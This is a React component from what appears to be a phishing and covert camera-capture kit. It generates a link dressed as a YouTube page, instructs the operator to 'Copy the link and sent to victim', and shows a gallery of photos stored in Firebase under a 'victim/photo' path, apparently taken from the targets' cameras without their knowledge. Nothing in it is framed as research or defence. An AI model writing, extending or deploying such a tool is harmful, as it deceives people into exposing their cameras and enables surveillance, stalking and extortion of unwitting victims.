import { onValue, ref } from "firebase/database";
import { useEffect, useState } from "react";
import { useNavigate, useParams } from "react-router-dom"
import { auth, database } from "../../../DATABASE/Config";
import useRoutProtect from "../../../CUSTOMHOOK/useRoutProtect";


const CameraLink = () => {
  const {uid} = useParams();
  const [link, setLink] = useState(`${window.location.host}/youtube/${uid}`)
  const [data, setData] = useState([]);
  const [copied, setCopied] = useState(false);
  const loginNavigate = useNavigate();

  useRoutProtect(auth, uid, loginNavigate)

  useEffect(() => {
    const dbRef = ref(database, `user/${uid}/victim/photo/`);

    onValue(dbRef, (snapshot) => {
      const dataArray =[]
      snapshot.forEach((childSnapshot) => {
        dataArray.push(childSnapshot.val())
      });
      setData(dataArray)
    })
  },[uid])

  const copyToClipBoard = () => {
    navigator.clipboard.writeText(link)
    .then(() => setCopied(true))
  }
  return (
    <div className="h-screen w-full">
      <div className="flex justify-center p-5">
        <div className="mr-5 flex flex-col items-center justify-center">
          <h1 className="p-2 font-bold">Copy the link and sent to victim</h1>
          <textarea value={link} className="h-10 w-96 border border-black rounded-xl overflow-hidden" />
        </div>
        <button onClick={copyToClipBoard} className="flex items-center justify-center border px-4 rounded-xl bg-blue-500 focus:bg-orange-600">{copied ? "Copied" : "Copy"}</button>
      </div>
      <div className="flex flex-wrap">
          {data.map((item, index) => {
            return <img src={item.url} alt={item.url} key={index} className="h-48 p-5" />
          })}
      </div>
    </div>
  )
}

export default CameraLink